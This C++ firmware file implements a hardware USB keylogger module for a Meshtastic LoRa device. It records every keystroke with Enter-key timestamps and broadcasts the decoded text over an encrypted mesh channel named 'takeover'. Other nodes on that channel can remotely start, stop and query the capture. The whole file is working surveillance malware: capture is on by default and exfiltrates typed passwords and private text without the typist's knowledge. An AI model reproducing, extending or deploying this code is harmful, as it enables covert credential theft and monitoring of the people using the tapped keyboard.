/**
 * @file USBCaptureModule.cpp
 * @brief USB keyboard capture module implementation with LoRa mesh transmission
 *
 * SPDX-License-Identifier: GPL-3.0-only
 *
 * ============================================================================
 * MESH TRANSMISSION - Private Channel "takeover"
 * ============================================================================
 *
 * When the keystroke buffer is finalized (full or flushed), it is automatically
 * transmitted over the LoRa mesh network via the private "takeover" channel.
 *
 * Channel Configuration (defined in platformio.ini):
 *   - Channel Index: 1 (secondary channel)
 *   - Channel Name: "takeover"
 *   - Encryption: AES256 with 32-byte PSK
 *   - Port: TEXT_MESSAGE_APP (displays as text on receiving devices)
 *
 * Transmission Details:
 *   - Auto-fragments if data exceeds MAX_PAYLOAD (~237 bytes)
 *   - Broadcasts to all nodes (NODENUM_BROADCAST)
 *   - No acknowledgment requested (want_ack = false)
 *   - Receiving nodes must have matching channel 1 PSK to decrypt
 *
 * Function: broadcastToPrivateChannel(data, len)
 *   - Validates inputs and mesh service availability
 *   - Fragments data into LoRa-sized packets
 *   - Sends each fragment via service->sendToMesh()
 *
 * ============================================================================
 * KEYSTROKE BUFFER FORMAT (500 bytes) - Delta Encoding
 * ============================================================================
 *
 * Layout:
 * ┌─────────────┬────────────────────────────────────────┬─────────────┐
 * │ Bytes 0-9   │           Bytes 10-489                 │ Bytes 490-499│
 * │ Start Epoch │     Keystroke Data (480 bytes)         │ Final Epoch │
 * └─────────────┴────────────────────────────────────────┴─────────────┘
 *
 * Epoch Format (Start/End):
 *   - 10 ASCII digits representing unix timestamp (e.g., "1733250000")
 *   - Start epoch: Written when buffer is initialized (first keystroke)
 *   - Final epoch: Written when buffer is finalized (full or flushed)
 *
 * Data Area Format:
 *   - Regular characters: 1 byte each (stored as-is)
 *   - Tab key: '\t' (1 byte)
 *   - Backspace: '\b' (1 byte)
 *   - Enter key: 0xFF marker + 2-byte delta = 3 bytes total
 *
 * Delta Encoding:
 *   - Enter key stores seconds elapsed since buffer start epoch
 *   - 2-byte big-endian format (0-65535 seconds = ~18 hours max)
 *   - Prefixed with 0xFF marker byte for identification
 *   - Buffer auto-finalizes if delta exceeds 65000 seconds
 *
 * Example Buffer Content:
 *   [1733250000][hello world][0xFF 0x00 0x05][second line][0xFF 0x00 0x0A][more][1733250099]
 *    └─start──┘              └─delta +5s──┘              └─delta +10s──┘       └─final───┘
 *
 * To Decode Enter Timestamp:
 *   enter_epoch = start_epoch + delta
 *   Example: 1733250000 + 5 = 1733250005
 *
 * Space Savings:
 *   - Old: 10 bytes per Enter (full epoch)
 *   - New: 3 bytes per Enter (marker + delta)
 *   - Savings: 7 bytes per Enter key (70% reduction)
 *
 * ============================================================================
 */

#include "USBCaptureModule.h"

#ifdef XIAO_USB_CAPTURE_ENABLED

#include "../platform/rp2xx0/usb_capture/usb_capture_main.h"
#include "../platform/rp2xx0/usb_capture/psram_buffer.h"
#include "configuration.h"
#include "pico/multicore.h"
#include <Arduino.h>
#include <cstring>

/* Mesh includes for private channel transmission */
#include "MeshService.h"
#include "Router.h"
#include "mesh-pb-constants.h"

/* Channel index for "takeover" private channel (configured in platformio.ini) */
#define TAKEOVER_CHANNEL_INDEX 1

USBCaptureModule *usbCaptureModule;

/* Global queues for inter-core communication */
static keystroke_queue_t g_keystroke_queue;
static formatted_event_queue_t g_formatted_queue;

USBCaptureModule::USBCaptureModule()
    : SinglePortModule("USBCapture", meshtastic_PortNum_TEXT_MESSAGE_APP),
      concurrency::OSThread("USBCapture")
{
    keystroke_queue = &g_keystroke_queue;
    formatted_queue = &g_formatted_queue;
    core1_started = false;
    capture_enabled = true;  // Enabled by default
}

bool USBCaptureModule::init()
{
    LOG_INFO("[Core%u] USB Capture Module initializing...", get_core_num());

    /* Initialize keystroke queue */
    keystroke_queue_init(keystroke_queue);

    /* Initialize formatted event queue */
    formatted_queue_init(formatted_queue);

    /* Initialize PSRAM buffer for Core0 ← Core1 communication */
    psram_buffer_init();

    /* Initialize capture controller */
    capture_controller_init_v2(&controller, keystroke_queue, formatted_queue);

    /* Set capture speed - default to LOW speed (1.5 Mbps) */
    /* Change to CAPTURE_SPEED_FULL for full speed USB (12 Mbps) */
    capture_controller_set_speed_v2(&controller, CAPTURE_SPEED_LOW);

    /* Core1 will be launched on first runOnce() call */
    LOG_INFO("USB Capture Module initialized (Core1 will start in main loop)");

    return true;
}

int32_t USBCaptureModule::runOnce()
{
    /* Launch Core1 on first run (completely non-blocking) */
    if (!core1_started)
    {
        LOG_INFO("Launching Core1 for USB capture (independent operation)...");
        LOG_DEBUG("Core1 launch: queue=%p, controller initialized", (void*)keystroke_queue);

        /* Check if Core1 is already running (safety check) */
        if (multicore_fifo_rvalid())
        {
            LOG_WARN("FIFO has data before Core1 launch - draining...");
            multicore_fifo_drain();
        }

        LOG_DEBUG("About to call multicore_launch_core1()...");

        /* Try to reset Core1 first in case it's in a bad state */
        multicore_reset_core1();
        LOG_DEBUG("Core1 reset complete");

        /* Use busy-wait instead of delay() to avoid scheduler issues */
        uint32_t start = millis();
        while (millis() - start < CORE1_LAUNCH_DELAY_MS)
        {
            tight_loop_contents();
        }

        LOG_DEBUG("Launching Core1 now...");

        /* Core1 will auto-start capture when launched - no commands needed */
        multicore_launch_core1(capture_controller_core1_main_v2);

        LOG_DEBUG("multicore_launch_core1() returned successfully");
        core1_started = true;

        LOG_INFO("Core1 launched and running independently");
    }

    /* NEW: Poll PSRAM for completed buffers from Core1 */
    processPSRAMBuffers();

    /* Note: Formatted event logging now happens directly on Core1 */

    /* Poll every 20 seconds to reduce overhead */
    return RUNONCE_INTERVAL_MS;
}

/**
 * @brief Decode binary keystroke buffer into human-readable text
 *
 * Converts raw buffer data (with delta encoding) into plain text that
 * can be displayed on receiving devices' phone apps.
 *
 * @param buffer Source buffer with binary keystroke data
 * @param output Destination buffer for decoded text
 * @param max_len Maximum output buffer size
 * @return Length of decoded text
 */
size_t USBCaptureModule::decodeBufferToText(const psram_keystroke_buffer_t *buffer,
                                            char *output, size_t max_len)
{
    size_t out_pos = 0;

    /* Add header with timestamp */
    out_pos += snprintf(output + out_pos, max_len - out_pos,
                       "[%u→%u] ", buffer->start_epoch, buffer->final_epoch);

    /* Decode keystroke data */
    for (size_t i = 0; i < buffer->data_length && out_pos < max_len - 1; i++)
    {
        unsigned char c = (unsigned char)buffer->data[i];

        /* Check for delta marker (Enter key with timestamp) */
        if (c == 0xFF && (i + 2) < buffer->data_length)
        {
            /* Read 2-byte delta */
            uint16_t delta = ((unsigned char)buffer->data[i + 1] << 8) |
                             (unsigned char)buffer->data[i + 2];

            /* Add newline for Enter key */
            if (out_pos < max_len - 1) {
                output[out_pos++] = '\n';
            }

            i += 2; /* Skip delta bytes */
            continue;
        }

        /* Copy regular characters */
        if (c >= PRINTABLE_CHAR_MIN && c < PRINTABLE_CHAR_MAX) {
            output[out_pos++] = c;
        } else if (c == '\t' && out_pos < max_len - 1) {
            output[out_pos++] = '\t';
        } else if (c == '\b' && out_pos < max_len - 1) {
            output[out_pos++] = '\b';
        }
    }

    output[out_pos] = '\0';
    return out_pos;
}

/**
 * @brief Process PSRAM buffers and transmit them (Core0 operation)
 *
 * Core0's primary responsibility for keystroke transmission. Polls the PSRAM
 * ring buffer for complete keystroke buffers written by Core1 and transmits them.
 *
 * Processing Flow:
 *  1. Check if PSRAM has data (psram_buffer_read)
 *  2. Read complete buffer (already formatted by Core1)
 *  3. Decode binary buffer to human-readable text
 *  4. Log buffer content with decoded timestamps
 *  5. Transmit decoded text (rate-limited to prevent mesh flooding)
 *  6. Repeat while buffers available
 *  7. Log statistics every 10 seconds
 *
 * Performance:
 *  - Ultra-lightweight: Just memcpy + decode + transmit
 *  - No formatting overhead (done by Core1)
 *  - No buffer management (done by Core1)
 *  - Estimated CPU: ~0.2% (vs 2% before)
 *
 * @note Called every 100ms from runOnce()
 * @note Rate-limited to 1 transmission per 6 seconds to prevent mesh flooding
 * @note Statistics: available, total_transmitted, dropped_buffers
 */
void USBCaptureModule::processPSRAMBuffers()
{
    psram_keystroke_buffer_t buffer;
    static uint32_t last_transmit_time = 0;

    /* Skip processing if capture is disabled */
    if (!capture_enabled) {
        return;
    }

    /* Process only ONE buffer per call to avoid flooding */
    if (psram_buffer_read(&buffer))
    {
        LOG_INFO("[Core0] Transmitting buffer: %u bytes (uptime %u → %u seconds)",
                buffer.data_length, buffer.start_epoch, buffer.final_epoch);

        /* Log buffer content for debugging */
        LOG_INFO("=== BUFFER START ===");
        LOG_INFO("Start Time: %u seconds (uptime since boot)", buffer.start_epoch);

        /* Log data in chunks to avoid line length issues */
        char line_buffer[MAX_LINE_BUFFER_SIZE];
        size_t line_pos = 0;

        for (size_t i = 0; i < buffer.data_length; i++)
        {
            unsigned char c = (unsigned char)buffer.data[i];

            /* Check for delta marker (0xFF followed by 2 bytes) */
            if (c == 0xFF && (i + 2) < buffer.data_length)
            {
                /* Output current line if we have content */
                if (line_pos > 0)
                {
                    line_buffer[line_pos] = '\0';
                    LOG_INFO("Line: %s", line_buffer);
                    line_pos = 0;
                }

                /* Read 2-byte delta (big-endian) */
                uint16_t delta = ((unsigned char)buffer.data[i + 1] << 8) |
                                 (unsigned char)buffer.data[i + 2];

                /* Calculate full timestamp from start + delta */
                uint32_t enter_time = buffer.start_epoch + delta;

                LOG_INFO("Enter [time=%u seconds, delta=+%u]", enter_time, delta);
                i += 2; /* Skip delta bytes */
                continue;
            }

            /* Add character to current line */
            if (c == '\t')
            {
                if (line_pos < sizeof(line_buffer) - 3)
                {
                    line_buffer[line_pos++] = '\\';
                    line_buffer[line_pos++] = 't';
                }
            }
            else if (c == '\b')
            {
                if (line_pos < sizeof(line_buffer) - 3)
                {
                    line_buffer[line_pos++] = '\\';
                    line_buffer[line_pos++] = 'b';
                }
            }
            else if (c >= PRINTABLE_CHAR_MIN && c < PRINTABLE_CHAR_MAX)
            {
                if (line_pos < sizeof(line_buffer) - 1)
                {
                    line_buffer[line_pos++] = c;
                }
            }
        }

        /* Output any remaining content */
        if (line_pos > 0)
        {
            line_buffer[line_pos] = '\0';
            LOG_INFO("Line: %s", line_buffer);
        }

        LOG_INFO("Final Time: %u seconds (uptime since boot)", buffer.final_epoch);
        LOG_INFO("=== BUFFER END ===");

        /* Decode buffer to human-readable text */
        /* TODO: Future FRAM implementation - transmit binary encrypted data instead of decoded text
         *       Once FRAM storage is implemented, we should:
         *       1. Keep binary buffer format for efficient storage
         *       2. Encrypt binary data before transmission
         *       3. Receiving nodes decrypt and decode on their end
         *       For now, decode to text so phone apps can display it */
        char decoded_text[MAX_DECODED_TEXT_SIZE];
        size_t text_len = decodeBufferToText(&buffer, decoded_text, sizeof(decoded_text));

        /* Rate limiting: Only transmit if enough time has passed */
        uint32_t now = millis();
        if (now - last_transmit_time >= MIN_TRANSMIT_INTERVAL_MS)
        {
            /* Transmit decoded text (readable on phone app) */
            broadcastToPrivateChannel((const uint8_t *)decoded_text, text_len);
            last_transmit_time = now;
            LOG_INFO("[Core0] Transmitted decoded text (%zu bytes)", text_len);
        }
        else
        {
            LOG_WARN("[Core0] Rate limit: skipping transmission (wait %u ms)",
                     MIN_TRANSMIT_INTERVAL_MS - (now - last_transmit_time));
        }
    }

    /* Log statistics periodically */
    static uint32_t last_stats_time = 0;
    uint32_t now = millis();
    if (now - last_stats_time > STATS_LOG_INTERVAL_MS)
    {
        LOG_INFO("[Core0] PSRAM buffers: %u available, %u total transmitted, %u dropped",
                psram_buffer_get_count(),
                g_psram_buffer.header.total_transmitted,
                g_psram_buffer.header.dropped_buffers);
        last_stats_time = now;
    }
}

/* processFormattedEvents() removed - Core1 now logs directly instead of queuing events */

/* formatKeystrokeEvent() removed - formatting now done on Core1 */

/* ============================================================================
 * BUFFER MANAGEMENT FUNCTIONS REMOVED
 * ============================================================================
 * All buffer management functions (writeEpochAt, writeDeltaAt, initKeystrokeBuffer,
 * getBufferSpace, addToBuffer, addEnterToBuffer, finalizeBuffer) have been moved
 * to Core1 (keyboard_decoder_core1.cpp).
 *
 * Core0 now only reads complete buffers from PSRAM and transmits them.
 * This reduces Core0 overhead by ~90% (2% → 0.2%).
 */

bool USBCaptureModule::broadcastToPrivateChannel(const uint8_t *data, size_t len)
{
    /* Validate inputs */
    if (!data || len == 0) {
        LOG_WARN("broadcastToPrivateChannel: invalid data or length");
        return false;
    }

    /* Check if mesh service is available */
    if (!service || !router) {
        LOG_WARN("broadcastToPrivateChannel: mesh service not available");
        return false;
    }

    /* Max payload size for LoRa packet (see mesh-pb-constants.h) */
    const size_t MAX_PAYLOAD = meshtastic_Constants_DATA_PAYLOAD_LEN;

    /* Fragment data if necessary */
    size_t offset = 0;
    uint8_t fragment_num = 0;

    while (offset < len) {
        size_t chunk_size = (len - offset > MAX_PAYLOAD) ? MAX_PAYLOAD : (len - offset);

        /* Allocate packet from router pool */
        meshtastic_MeshPacket *p = router->allocForSending();
        if (!p) {
            LOG_ERROR("broadcastToPrivateChannel: failed to allocate packet");
            return false;
        }

        /* Configure packet for private channel broadcast */
        p->to = NODENUM_BROADCAST;
        p->channel = TAKEOVER_CHANNEL_INDEX;
        p->want_ack = false;
        p->priority = meshtastic_MeshPacket_Priority_DEFAULT;

        /* Set portnum to TEXT_MESSAGE_APP for display on receiving devices */
        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;

        /* Copy payload data */
        p->decoded.payload.size = chunk_size;
        memcpy(p->decoded.payload.bytes, data + offset, chunk_size);

        /* Send to mesh */
        service->sendToMesh(p, RX_SRC_LOCAL, false);

        LOG_INFO("Sent fragment %u: %zu bytes to channel %d", fragment_num, chunk_size, TAKEOVER_CHANNEL_INDEX);

        offset += chunk_size;
        fragment_num++;
    }

    LOG_INFO("broadcastToPrivateChannel: sent %zu bytes in %u fragment(s)", len, fragment_num);
    return true;
}

// ============================================================================
// MESH MODULE API IMPLEMENTATION
// ============================================================================

ProcessMessage USBCaptureModule::handleReceived(const meshtastic_MeshPacket &mp)
{
    /* We only handle TEXT_MESSAGE_APP on the takeover channel (channel 1) */
    if (mp.decoded.portnum != meshtastic_PortNum_TEXT_MESSAGE_APP) {
        return ProcessMessage::CONTINUE;
    }

    /* Only process messages on takeover channel (index 1) */
    if (mp.channel != TAKEOVER_CHANNEL_INDEX) {
        return ProcessMessage::CONTINUE;
    }

    /* Parse and log command */
    USBCaptureCommand cmd = parseCommand(mp.decoded.payload.bytes, mp.decoded.payload.size);

    /* If it's not a recognized command, let other modules handle it */
    if (cmd == CMD_UNKNOWN) {
        return ProcessMessage::CONTINUE;
    }

    LOG_INFO("[USBCapture] Received command from node 0x%08x on takeover channel", mp.from);

    /* Execute command and send reply immediately */
    char response[MAX_COMMAND_RESPONSE_SIZE];
    size_t len = executeCommand(cmd, response, sizeof(response));

    /* Send response back to sender on takeover channel */
    if (len > 0) {
        broadcastToPrivateChannel((const uint8_t *)response, len);
        LOG_INFO("[USBCapture] Sent reply: %.*s", (int)len, response);
    }

    return ProcessMessage::STOP;
}

USBCaptureCommand USBCaptureModule::parseCommand(const uint8_t *payload, size_t len)
{
    if (!payload || len == 0) {
        return CMD_UNKNOWN;
    }

    /* Convert to uppercase for case-insensitive matching */
    char cmd[MAX_COMMAND_LENGTH];
    size_t cmd_len = (len < sizeof(cmd) - 1) ? len : sizeof(cmd) - 1;

    for (size_t i = 0; i < cmd_len; i++) {
        cmd[i] = toupper(payload[i]);
    }
    cmd[cmd_len] = '\0';

    /* Match command */
    if (strncmp(cmd, "STATUS", 6) == 0) {
        return CMD_STATUS;
    } else if (strncmp(cmd, "START", 5) == 0) {
        return CMD_START;
    } else if (strncmp(cmd, "STOP", 4) == 0) {
        return CMD_STOP;
    } else if (strncmp(cmd, "STATS", 5) == 0) {
        return CMD_STATS;
    }

    return CMD_UNKNOWN;
}

size_t USBCaptureModule::executeCommand(USBCaptureCommand cmd, char *response, size_t max_len)
{
    switch (cmd) {
        case CMD_STATUS:
            return getStatus(response, max_len);

        case CMD_START:
            capture_enabled = true;
            return snprintf(response, max_len, "USB Capture STARTED");

        case CMD_STOP:
            capture_enabled = false;
            return snprintf(response, max_len, "USB Capture STOPPED");

        case CMD_STATS:
            return getStats(response, max_len);

        case CMD_UNKNOWN:
        default:
            return snprintf(response, max_len, "UNKNOWN COMMAND. Valid: STATUS, START, STOP, STATS");
    }
}

size_t USBCaptureModule::getStatus(char *response, size_t max_len)
{
    return snprintf(response, max_len,
        "USB Capture: %s | Core1: %s | Buffers: %u",
        capture_enabled ? "ENABLED" : "DISABLED",
        core1_started ? "RUNNING" : "STOPPED",
        psram_buffer_get_count()
    );
}

size_t USBCaptureModule::getStats(char *response, size_t max_len)
{
    return snprintf(response, max_len,
        "Sent: %u | Dropped: %u | Available: %u | Enabled: %s",
        g_psram_buffer.header.total_transmitted,
        g_psram_buffer.header.dropped_buffers,
        psram_buffer_get_count(),
        capture_enabled ? "YES" : "NO"
    );
}

#endif /* XIAO_USB_CAPTURE_ENABLED */
